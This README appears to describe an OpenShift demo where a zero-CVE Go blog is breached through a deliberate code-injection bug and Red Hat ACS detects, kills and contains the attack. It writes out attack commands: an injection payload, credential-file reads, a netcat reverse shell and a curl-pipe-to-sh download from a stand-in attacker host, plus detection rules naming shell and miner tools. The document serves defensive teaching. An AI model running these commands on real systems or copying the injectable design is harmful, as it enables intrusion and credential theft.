# The Unhackable Blog
### RHACS Threat Detection & Response — zero CVEs, still breached, caught in seconds

> *"0 CVEs is where security starts, not where it ends."*

📸 **[Step-by-step walkthrough with screenshots of a real run →](docs/WALKTHROUGH.md)**
🎤 **[The 40-minute talk: run of show →](docs/TALK.md)** · **[word for word →](docs/SCRIPT.md)**

A self-contained demo for **Red Hat Advanced Cluster Security 5.0** on **OpenShift Local (CRC)**.
A blog with **zero CVEs and the lowest risk score in the cluster** gets breached through a bug
in its own code. Every attacker move — recon, credential hunting, lateral movement, reverse shell,
crypto miner — lights up in RHACS within seconds. Then RHACS **kills the pod** and a
**NetworkPolicy** contains the blast radius. No AI, no LLMs: just a classic web bug and the
runtime controls that catch it.

---

## Contents

- [The story in one minute](#the-story-in-one-minute)
- [Quick start with make](#quick-start-with-make)
- [Live mode — make live](#live-mode--make-live-recommended-on-stage)
- [Setup (once)](#setup-once)
- [Before you go on stage](#before-you-go-on-stage)
- [Delivering the demo, act by act](#delivering-the-demo-act-by-act)
- [Reset between runs](#reset-between-runs)
- [The attacker lives outside the cluster](#the-attacker-lives-outside-the-cluster)
- [roxctl and the rox-* helpers](#roxctl-and-the-rox--helpers)
- [RHACS 5.0 features used](#rhacs-50-features-used)
- [What's in the box](#whats-in-the-box)
- [Questions you will get](#questions-you-will-get)
- [Troubleshooting](#troubleshooting)

---

## The story in one minute

| Act | Title | What happens | What RHACS shows |
|---|---|---|---|
| 1 | **Unhackable** | Marketing calls the blog unhackable. RHACS agrees: 0 CVEs, hardened, no violations. | Vulnerability management: **0 CVEs**. Risk: lowest. Violations: none. |
| 2 | **Day zero** | *Check links* lets writers attach a Go *rule*, run by an embedded interpreter (yaegi) that was handed `exec.Command`. A rule is code — so it runs host commands. Code injection (CWE-94). | *Unauthorized process* (`id`, `uname`, `cat`) — the baseline is a single binary. |
| 3 | **Loot** | No SA token, no secrets in env… but AWS keys in `~/.aws/credentials` and secrets in the app's `.env`. They're **honeytokens**. Then the blog reads card data from `payments-api`. | *Honeytoken touched*. *Unexpected network flow to payments-api* (its baseline is empty and locked). Network graph: anomalous blog → payments, blog → kube API. |
| 4 | **Persistence & profit** | Reverse shell to `attacker.example.local:4444`. Crypto miner downloaded into `/tmp`, made executable, started. | *Reverse shell tool executed*, *Crypto miner*, *Container drift: file dropped or made executable*, flows to the external entity **attacker.example.local**. |
| 5 | **Respond** | **Kill** first: enforcement on, the attacker's next command kills the pod — blast radius cut, time bought. **Then** a NetworkPolicy closes the door. | Violation with *Enforced: kill pod*. New clean pod. Egress blocked. |
| 6 | **Fix forward** | Ship v2: rule engine removed, URL parsed, native HTTP client. Still 0 CVEs. Exploit is dead. | Clean v2 image, no new violations. |

**The one-line takeaway:** vulnerability scanning tells you what *could* go wrong in the code you
*imported*; runtime detection tells you what *is* going wrong in the code you *wrote* — and stops it.

---

## Quick start with `make`

```bash
make install     # first time only: CRC + RHACS + demo (~45-60 min)
make up          # every session: starts EVERYTHING (CRC, RHACS, demo, attacker), installs what's
                 # missing, resets, then verifies end to end — when it says "armed", you can show
make verify      # re-run just the end-to-end checks
make status      # where are we?
make password    # RHACS console URL, user and password

make live        # the show: tmux with attacker curl | C2 nc | RHACS alerts | pods
make act1 … act6 # or the scripted acts (run `make c2` in a second terminal before act4)
make reset       # between runs
make down        # stop everything (live views, attacker, CRC) — deletes nothing, frees the RAM
make recreate    # cluster broken beyond a restart? delete it and rebuild everything (asks first)
```

`make` on its own lists every target. The sections below explain what each step does.

---

## Live mode — `make live` (recommended on stage)

One tmux window, five panes. **You type one short command per attacker move; everything else reacts
on its own.** The pane shows the request and a clean, readable result — no shell noise — so a CISO or
architect in the room can follow every step and watch RHACS catch it. Each pane has its own subtle
tint so a busy screen stays readable — the two **warm** panes on the left are the **attacker (your
laptop)**; the three **cool** panes on the right are the **live cluster**.

```
┌──────────────────────────────────┬──────────────────────────────────┐
│ 1  ATTACKER — you type pwn '…'   │ 3  RHACS — live threat timeline  │
│    (cheat sheet printed here)    │    severity · MITRE · what ran   │
│                                  ├──────────────────────────────────┤
├──────────────────────────────────┤ 4  BLOG — app logs (oc logs -l)  │
│ 2  C2 — nc on attacker.example   │    every attack = a "link check" │
│    .local:4444 (shell lands here)├──────────────────────────────────┤
│                                  │ 5  PODS — the kill + restart     │
└──────────────────────────────────┴──────────────────────────────────┘
```

The **BLOG** pane is the "fix *what*?" answer: the app's own logs show only innocent `link check`
lines — the attack is invisible at the application layer, which is exactly why runtime detection
earns its place. Act 6 fixes that one endpoint.

Each move is one line. `link` uses the feature normally; `pwn` runs a command through the injection.
Both make the exact same HTTP POST a browser would — they just print the request and result cleanly:

```bash
pwn 'id'     # = curl -sk $BLOG/api/links/check --data-urlencode "url=';id #", de-noised
```

| Step | Type in pane 1 | Watch |
|---|---|---|
| the feature | `link https://www.redhat.com/en` | `alive: …` — normal use, no alert |
| 1 · the bug | `pwn 'id'` | pane 3: *Unauthorized process* |
| 2 · credentials | `pwn 'cat ~/.aws/credentials'`, `pwn 'cat /opt/blog/.env'` | pane 3: *Honeytoken touched* |
| 3 · lateral | `pwn 'curl -s http://payments-api.payments.svc:8080/api/v1/cards'` | pane 3: *Unexpected network flow to payments-api* |
| 4 · reverse shell | `pwn 'nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 &'` | pane 2: `connect to …` then a live shell — type `id`, `ps` there |
| 5 · miner | `pwn 'curl -s http://attacker.example.local:8080/stage.sh \| sh'` | pane 3: *Crypto miner*, *Container drift* |
| respond 1 | `make enforce`, then repeat step 1 | pane 4: pod killed and replaced · pane 3: *POD KILLED* · pane 2: shell dies, listener restarts |
| respond 2 | `make contain`, then repeat step 4 | nothing reaches pane 2 — egress blocked |
| fix | `make fix`, then repeat step 1 | `not a valid http(s) URL` |
| again | `make reset` | |

The full list is printed in pane 1 when the session opens (`scripts/live.sh --cheatsheet`). The reverse
shell is raw — no prompt — so pane 2 stays quiet until `connect to … from …` appears; then type `id`
blindly. Click a pane to type in it; `Ctrl-b d` detaches, `tmux kill-session -t tdr` closes it.

> After changing `app/blog`, run `make images` to rebuild, push and rescan (the cluster must be up).

---

## Setup (once)

Requirements: Fedora/RHEL laptop with KVM, **≥ 30 GB RAM, 8+ cores, 120 GB free disk**, `oc`, `roxctl`,
`podman`, `jq`, a Red Hat **pull secret** at `~/pull-secret.txt`
([download](https://console.redhat.com/openshift/create/local)) and the CRC tarball in `~/Downloads`.

```bash
cd use_cases/threat-detection-response

scripts/00-crc-up.sh        # ~25 min first time: libvirt, crc setup, crc start (8 vCPU / 20 GiB / 100 GiB)
scripts/01-rhacs-install.sh # ~15 min: operator → Central → CRS → SecuredCluster "production" → API token
scripts/02-demo-setup.sh    # ~5 min: build+push images, deploy, policies, learn + LOCK baselines, start the attacker
```

All three are idempotent — re-run any of them safely. They ask for root once (fingerprint works).

**Sizing & networking.** CRC defaults (4 vCPU / 10.75 GiB / 31 GiB) can't carry RHACS. The script sets
**8 vCPU, 20 GiB RAM, 100 GiB disk** (sparse — only used space costs), and turns cluster monitoring off
(saves ~4 GiB). Networking is `system` mode (libvirt bridge `192.168.130.0/24`, DNS for
`*.apps-crc.testing` via the NetworkManager dispatcher that `crc setup` installs). **Host network access
stays off**: the attacker infrastructure lives *inside* the cluster, so the VM never needs to reach the
laptop and the laptop firewall can keep dropping all inbound traffic.

| Script | What it does |
|---|---|
| `00-crc-up.sh` | Installs `crc` from the tarball, installs libvirt/KVM, joins the `libvirt` group (no re-login), configures CRC sized for RHACS, `crc setup`, `crc start`, logs in, exposes the image registry. Tunables: `CRC_CPUS`, `CRC_MEMORY`, `CRC_DISK`, `PULL_SECRET`. |
| `01-rhacs-install.sh` | RHACS 5.0 operator (stable channel), Central tuned for one node (Scanner V4 only), a **Cluster Registration Secret** generated with `roxctl central crs generate`, SecuredCluster `production` with eBPF collector and file activity monitoring, and an API token in `.state/rhacs.env` (mode 600, git-ignored). The admin password is **never printed**: `--password` copies it to the clipboard. |
| `02-demo-setup.sh` | Builds blog v1/v2 (pushed to the CRC registry) and the attacker kit (local only), connects RHACS to the registry, deploys the blog and payments-api fresh, loads the policies as code, enables *Unauthorized Network Flow*, generates normal traffic, **pins and locks the process and network baselines**, waits for Scanner V4, then starts the attacker (`attacker.sh up`). |
| `attacker.sh` | The attacker's machine is **this laptop** — see [The attacker lives outside the cluster](#the-attacker-lives-outside-the-cluster). `up`, `c2`, `logs`, `status`, `down`. |

---

## Before you go on stage

```bash
scripts/demo.sh reset      # v1, enforcement off, NetworkPolicies removed, violations resolved
scripts/demo.sh status     # sanity check: image v1, enforcement [], no netpols, no violations
```

Lay out your screen:

| Window | What |
|---|---|
| **Terminal A** (big font) | `scripts/demo.sh act1` … `act6` |
| **Terminal B** | `scripts/attacker.sh c2` — the attacker's reverse-shell listener on this laptop (start it during Act 4) |
| **Browser tab 1** | The blog: `https://blog-unhackable.apps-crc.testing` (open `/write`) |
| **Browser tab 2** | RHACS → **Violations**, filtered to namespace `unhackable` |
| **Browser tab 3** | RHACS → **Network Graph**, namespaces `unhackable`, `payments`, `attacker` |
| **Browser tab 4** | RHACS → **Vulnerability Management** → image `unhackable/blog:v1` |

RHACS login: `rox-ui` prints URL, user and password (`rox-password` prints just the password and copies it).
`demo.sh act1` prints all the links.

Each act prints **💬 what to say** and **👉 what to show**. Acts pause at `[enter]` where you switch
to the browser (`NO_PAUSE=1` disables pauses). Total runtime: **20–25 minutes**.

---

## Delivering the demo, act by act

### Act 1 — "Unhackable" (3 min)

```bash
scripts/demo.sh act1
```

**Open with the claim.** Show the blog homepage: *"The blog that can't be hacked."* Then prove it with RHACS:

- **Vulnerability Management → Images → `unhackable/blog:v1`**: **0 CVEs**. Point out why: a static Go
  binary with no third-party modules, latest Alpine with everything upgraded, `apk` removed. No KEV
  matches either — nothing on CISA's exploited list because there's nothing on any list.
- **Risk → `blog`**: lowest in the cluster. Non-root, read-only root filesystem, all capabilities
  dropped, no service account token, limits set.
- **Violations**: none.

> 💬 *"Every scanner is green. Every admission gate passes. If this were your app, you'd ship it.
> So — is it secure?"*

Let the question hang. That's the hook for the rest of the talk.

### Act 2 — "Day zero" (4 min)

```bash
scripts/demo.sh act2
```

1. In the browser open **`/write`**, press **Check links** — it works, links are green. This feature
   is real and useful.
2. Explain the feature: *Check links* lets power users attach a short Go *rule* to validate a link. The
   app evaluates it with an embedded Go interpreter (**yaegi**) — and handed that sandbox `exec.Command`.
   Show `app/blog/linkcheck_v1.go`. yaegi scans clean (**0 CVEs**) — the bug is giving it a dangerous
   capability and untrusted input.
3. Press enter: the "rule" is Go that runs `id`. It comes back: **remote code execution** (CWE-94).

> 💬 *"That's not a CVE. There's no package to upgrade, no advisory, no scanner signature. It's our
> code. This is the class of bug that zero-CVE images don't protect you from."*

Switch to **Violations**: *TDR – Unauthorized process in the Unhackable Blog* is already there —
`id`, `uname`, `cat`, `head`. Open it and show the process details: exec path, arguments, parent,
UID, container, time. Explain **process baselines**: RHACS learned that this container runs exactly
a **single binary** (`blog`) — the app validates links natively and runs rules in-process, so it
spawns no child process at all — and we **locked** that baseline. Any process is an alert.

> 💡 Worth noticing: the attacker's own `sh` and `curl` are *in* the baseline (the feature uses them).
> RHACS still catches every other binary. That's why baselines beat signatures.

### Act 3 — "Living off the land: loot" (4 min)

```bash
scripts/demo.sh act3
```

The attacker hunts for credentials and hits the hardening:

- **No service account token** → nothing to steal for the Kubernetes API.
- **Nothing in the environment.**
- **But: `~/.aws/credentials` and `/opt/blog/.env`!** The attacker reads AWS keys and app secrets.

> 💬 *"Those keys are fake. We planted them. The app never touches that file — so the only thing that
> ever will is an attacker. It's a honeytoken, and RHACS just told us someone took the bait."*

Show **TDR – Honeytoken touched** in Violations.

Then **lateral movement**: the blog probes the Kubernetes API and reads **card data from
`payments-api`**. Switch to the **Network Graph**: the blog → payments-api flow is drawn as
**anomalous**, and **TDR – Unexpected network flow to payments-api** fires: payments-api's network
baseline is **empty and locked** — nothing legitimate ever calls it.

### Act 4 — "Persistence and profit" (4 min)

Start the listener in **Terminal B** first:

```bash
scripts/attacker.sh c2
```

Then in Terminal A:

```bash
scripts/demo.sh act4
```

1. **Reverse shell.** The blog connects back to `attacker.example.local:4444` — the presenter's laptop. In Terminal B, type live:
   `id`, `hostname`, `ps`. The audience sees an interactive shell inside your "unhackable" pod.
2. **Crypto miner.** The attacker downloads `http://attacker.example.local:8080/stage.sh` and pipes it into
   `sh`. Root FS is read-only, `/dev/shm` is `noexec` — but `/tmp` is a writable emptyDir. A binary named
   `xmrig` lands in `/tmp/.cache`, gets `chmod +x`, starts and connects to `attacker.example.local:3333`.
   (It's a harmless simulator: it burns one core and mines nothing.) `scripts/attacker.sh logs` shows the
   attacker's side: the download and the incoming miner shares.

Show the stack of violations: **Reverse shell tool executed**, **Crypto miner**, **Container drift: file
dropped or made executable** (File Activity Monitoring saw the `CREATE` in `/tmp` and the `chmod`), plus new
**network flows** from the blog to the external entity **attacker.example.local** on 8080, 4444 and 3333.

> 💬 *"Everything the attacker did was seen within seconds, and every alert is mapped to MITRE
> ATT&CK. But seeing isn't stopping. The miner is still running and the shell is still open."*

### Act 5 — "Respond: shrink the blast radius, then close the door" (4 min)

```bash
scripts/demo.sh act5
```

Two steps, in the order real incident response works — **stop the bleeding, then close the door**:

1. **Kill (immediate containment).** The script switches the TDR policies to **Kill Pod** (they're
   `SecurityPolicy` custom resources — policy as code). The attacker comes back with `id`… **the pod is
   killed** (OpenShift records a *StackRox enforcement* event) and Kubernetes replaces it from the
   original image. Terminal B — the reverse shell — **goes dead**; the miner and `/tmp/.cache` are gone.
   Every new attempt costs the attacker the pod: the blast radius is now one command, and we've
   **bought time**.
2. **Network enforcement (with time bought).** A NetworkPolicy: the blog may receive traffic from the
   router and reach DNS and the internet on 80/443; payments-api accepts nothing. The retry uses
an in-process Go rule — the **app itself** makes the outbound call, no new process for RHACS to kill — and
   it times out: `attacker.example.local:8080` is unreachable. The NetworkPolicy stops what enforcement can't see.

> 💬 *"The kill stopped this attacker. The NetworkPolicy stops the next one before the first packet
> leaves."*

Point out the violation's **Enforcement** tab: *"Kill Pod has been applied N times"*.

> ⚠️ With enforcement on, **anything** outside the baseline kills the pod — including `head`, `grep`
> or an `oc exec` by you. That is the point. `scripts/demo.sh reset` turns it off again.

### Act 6 — "Fix forward" (3 min)

```bash
scripts/demo.sh act6
```

Show the diff between `app/blog/linkcheck_v1.go` and `linkcheck_v2.go`: parse the URL, allow only
http/https, use Go's HTTP client — **no rule engine, nothing evaluated**. v2 rolls out, still **0 CVEs**, and the exploit
returns *rejected*.

> 💬 *"Close with the three layers: shift-left kept the image clean — zero CVEs. Runtime detection
> caught the attack the scanner could never see. Enforcement and network policy stopped it. You need
> all three."*

---

## Reset between runs

```bash
scripts/demo.sh reset     # enforcement off, NetworkPolicies removed, back to v1, fresh pods, violations resolved
```

Baselines stay locked across resets (they're per deployment, not per pod).
Full rebuild: `scripts/02-demo-setup.sh`. Everything from scratch:
`scripts/01-rhacs-install.sh --uninstall && crc delete`.

Ad-hoc commands through the vulnerability: `scripts/demo.sh pwn 'ls -la /tmp'`.

---

## The attacker lives outside the cluster

Nothing attacker-side runs in OpenShift. The attacker's machine is **the presenter's laptop**, reached by
**name** — exactly like a real attacker-controlled domain on the internet:

```
 blog pod ──► attacker.example.local:8080   payload server  (stage.sh, xmrig)
          ──► attacker.example.local:3333   mining pool
          ──► attacker.example.local:4444   C2 — reverse shell listener (scripts/attacker.sh c2)
```

| Piece | How |
|---|---|
| **The address** | `1.2.3.4` — a real, routable public IPv4. RHACS treats private ranges (`192.168.x`, `10.x`) as internal, so the attacker needs a public address. `attacker.sh up` adds it to the laptop's `crc` bridge (runtime only) — "spoofed" locally: the CRC VM's default gateway is the laptop, so pod traffic to it lands there and **never leaves the machine**. Override with `ATTACKER_IP=…`. |
| **The name** | `attacker.sh up` runs the attacker's own nameserver (podman, `:5300/udp`) answering `*.example.local` with `1.2.3.4`, and adds one forwarding rule to OpenShift DNS: zone `example.local` → that nameserver. |
| **The services** | podman containers on the laptop, bound **only** to `1.2.3.4`. |
| **The firewall** | The laptop keeps dropping all inbound traffic. Only the CRC bridge (zone `libvirt`) gets *runtime* rules for 5300/udp, 8080/3333/4444/tcp from `192.168.130.0/24`. `attacker.sh down` (or a reboot) removes them. |
| **In RHACS** | `1.2.3.4/32` is registered as a named external network entity, so the Network Graph shows **attacker.example.local** outside the cluster, not an IP. Ordinary internet traffic stays one *External Entities* node. |

---

## roxctl and the `rox-*` helpers

`01-rhacs-install.sh` stores an API token and the Central endpoint in `~/.config/rhacs/crc.env` (mode 600)
and installs `~/.bashrc.d/rhacs.sh`, so **every new shell** has `ROX_ENDPOINT` and `ROX_API_TOKEN` and plain
`roxctl` just works (`roxctl central whoami`).

The same file loads readable helpers. They **do not replace `roxctl`** — they call it with `-o json` and print
tables that fit the screen:

| Helper | Shows |
|---|---|
| `rox-ui` / `rox-password` | Central URL, user, password (password also copied to the clipboard) |
| `rox-scan IMAGE [SEV]` | CVE summary + table |
| `rox-check IMAGE` / `rox-deploy FILE` | build-time / deploy-time policy violations |
| `rox-violations [NS]` | active violations, newest first, with enforcement count |
| `rox-processes NS/DEPLOY` | every process RHACS saw in a deployment |
| `rox-baseline NS/DEPLOY` | the locked process baseline |

---

## RHACS 5.0 features used

| Feature | Where |
|---|---|
| **Scanner V4 only** (the legacy scanner is gone in 5.0) | `rhacs/install/central.yaml` |
| **Cluster Registration Secret** (`roxctl central crs generate`) | `01-rhacs-install.sh` |
| **File Activity Monitoring** (`File Path` + `File Operation`: `CREATE`, `RENAME`, `PERMISSION_CHANGE`, …) — watches only the paths policies name; keep them narrow | `tdr-file-drift` |
| **Process baseline auto-lock** (`processBaselines.autoLock`) | `secured-cluster.yaml` (the demo also locks explicitly via API) |
| **Process indicator filtering** (`processIndicators.excludeOpenshiftNs`) | `secured-cluster.yaml` |
| **Cluster labels** (`clusterLabels`) | `secured-cluster.yaml` |
| **Policy as code** (`SecurityPolicy` CRs, status conditions `AcceptedByCentral`) | `rhacs/policies/` |

---

## What's in the box

```
threat-detection-response/
├── Makefile                       make install · up · reset · status · act1…act6 · down
├── README.md                      this file — the story and how to deliver it
├── docs/WALKTHROUGH.md            the full story, act by act, with screenshots of a real run
├── docs/TALK.md                   the 40-minute talk: run of show, speaking guide, Q&A, checklist
├── docs/SCRIPT.md                 the talk word for word, with stage directions
├── docs/slides/                   intro slide images (release.png)
├── app/
│   ├── blog/                      Go, one dependency (yaegi), Alpine runtime — 0 CVEs
│   │   ├── main.go                blog + payments mode
│   │   ├── linkcheck_v1.go        the bug (evals untrusted Go via yaegi)       build: VARIANT=v1
│   │   ├── linkcheck_v2.go        the fix (url.Parse + net/http)       build: VARIANT=v2
│   │   ├── web/                   templates
│   │   └── Containerfile
│   └── attacker-kit/              runs on the LAPTOP: nameserver, payload server, fake pool, harmless xmrig
├── deploy/
│   ├── app/                       namespaces, blog (+ honeytokens), payments-api
│   └── response/                  containment NetworkPolicies (Act 5)
├── rhacs/
│   ├── install/                   operator, Central, SecuredCluster
│   └── policies/                  TDR runtime policies as SecurityPolicy CRs
└── scripts/
    ├── 00-crc-up.sh  01-rhacs-install.sh  02-demo-setup.sh
    ├── attacker.sh                the attacker's laptop side: up, c2, logs, status, down
    ├── demo.sh                    acts, pwn, status, reset
    └── lib/                       common.sh, rhacs-aliases.sh (rox-*), rhacs-baselines.sh (from the rhacs repo)
```

### The policies

| Policy | Detects | Act 5 |
|---|---|---|
| TDR – Unauthorized process in the Unhackable Blog | any process outside the locked baseline | kill pod |
| TDR – Reverse shell tool executed | `nc`, `ncat`, `netcat`, `socat` | kill pod |
| TDR – Crypto miner in the Unhackable Blog | `xmrig`, `minerd`, `cpuminer`, … | kill pod |
| TDR – Container drift: file dropped or made executable | File Activity Monitoring: `CREATE`/`RENAME` under `/tmp/**`, `PERMISSION_CHANGE` under `/tmp/**` and `/var/cache/blog/**` (the only writable volumes) | kill pod |
| TDR – Honeytoken touched: decoy AWS credentials | any process whose arguments name `.aws/credentials` or a `.env` file | alert |
| TDR – Kubernetes API reconnaissance from the blog | any process whose arguments name the in-cluster API, `kubernetes.default` | alert |
| TDR – Unexpected network flow to payments-api | network baseline anomaly, scoped to `payments` (empty, locked baseline) | alert |

All TDR policies are scoped to cluster `production` (namespace `unhackable`, or `payments` for lateral
movement) and mapped to MITRE ATT&CK. RHACS's built-ins *Netcat Execution Detected*, *Cryptocurrency
Mining Process Execution* and *Unauthorized Process Execution* fire too. The built-in *Unauthorized
Network Flow* stays disabled: on a single-node cluster every DNS lookup appears as a new UDP flow.

**RHACS 5.0 lessons baked into these policies** (found while testing):

- File Activity Monitoring watches **exactly** the paths your policies name. A `/**` makes it inventory
  the whole node — and nothing gets reported. Name the writable volumes only.
- FAM reports **modifications** (create, rename, permission/ownership change, write-intent open).
  Reading a read-only file isn't one — that's why the honeytoken uses process arguments.
- A runtime policy can't mix process and file criteria in different sections.
- A network baseline anomaly fires the **first** time a flow between two deployments appears;
  resolving the alert doesn't re-arm it. `reset` recreates payments-api so every run is fresh.

---

## Questions you will get

**"Why not just remove the shell from the image?"**
You should — v2 doesn't need it. But the point stands: the image *passed* every check with the shell
in it, and plenty of real apps legitimately shell out. Distroless shrinks the toolbox; it doesn't fix
your code. And attackers bring their own tools (Act 4 downloads one).

**"Couldn't a WAF catch the malicious rule?"**
Maybe this payload. Not the next encoding. Runtime detection doesn't care how the attacker got in — it
sees what they *do*.

**"Won't kill-pod enforcement take my app down?"**
It kills one pod; the Deployment replaces it in seconds. It only fires on behaviour outside a locked
baseline, so it's for workloads whose behaviour you know. Start in alert mode (Acts 2–4), enforce
once the baseline is stable (Act 5).

**"Doesn't the attacker get a connection before the kill?"**
Yes — briefly. Kill Pod is a *response*, not prevention: RHACS sees the `exec`, then kills the pod.
Measured on this demo with enforcement on and **no** NetworkPolicy: the attacker sends
`nc attacker.example.local 4444 -e /bin/sh` at t=0; the TCP connection reaches the attacker; at
**t=0.69 s** RHACS kills the pod and the connection drops; at **t=2.9 s** a clean pod is Ready. Useless to
a human typing commands — and the NetworkPolicy (Act 5, step 2) removes even that window.

**"What can trigger the kill — process, file or network?"**
Tested on RHACS 5.0:

| Trigger | Kill Pod |
|---|---|
| Process (binary outside the baseline, `nc`, `xmrig`, …) | ✓ pod killed |
| File activity (file created in `/tmp` by an *allowed* binary) | ✓ pod killed — the event names the file policy |
| Network-flow anomaly (blog → payments-api) | ✗ **alert only.** Central *accepts* Kill Pod on the policy without error, but no pod is killed |

So kills come from what runs and what gets written; network anomalies are answered with a
NetworkPolicy — exactly Act 5's two steps. Don't assume a network-flow policy enforces just because
the UI saved it.

**"How long does baselining take?"**
RHACS learns automatically during an observation period. This demo locks the baseline right after
generating normal traffic, through the API (`scripts/lib/rhacs-baselines.sh`).

**"Is the miner real?"**
No. `app/attacker-kit/xmrig` is a simulator named `xmrig` so the policy matches it. It burns one core
for at most 10 minutes and talks only to the fake pool on the presenter's laptop.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `crc setup` complains about the libvirt group | the script re-executes itself with `sg libvirt`; otherwise log out and back in once |
| Blog can't reach `attacker.example.local` | `scripts/attacker.sh status` — address on the bridge + firewall must show `open-for-crc`; re-run `attacker.sh up` after `crc stop/start` |
| `*.apps-crc.testing` times out while NordVPN is connected | its firewall blocks the CRC bridge: `nordvpn whitelist add subnet 192.168.130.0/24` (once) |
| `*.apps-crc.testing` doesn't resolve | `crc setup` installs a NetworkManager dispatcher for systemd-resolved; restart NetworkManager or re-run `crc setup` |
| Policy shows `accepted: false` | `oc get securitypolicy -n stackrox <name> -o yaml` → `status.message` |
| No *Unauthorized process* alert | baseline not locked: `source scripts/lib/rhacs-baselines.sh; load…; rhacs-pb-lock unhackable/blog` (or re-run `02-demo-setup.sh`) |
| Act 5 pod not killed | enforcement is pushed by Central to Sensor; wait ~15 s after `act5` starts, check `scripts/demo.sh status` |
| *Unexpected network flow to payments-api* doesn't fire on a re-run | run `scripts/demo.sh reset` first — it recreates payments-api so the flow is new again |
| Legit link checks raise *Unauthorized process* | the baseline should be exactly `/usr/local/bin/blog`; run `scripts/demo.sh reset` (or re-run `02-demo-setup.sh`) |
| Image shows CVEs | rebuild: `scripts/02-demo-setup.sh` pulls the latest Alpine/Go and upgrades every package |
| Cluster slow on battery | plug in: the laptop's low-power mode parks CPU cores |
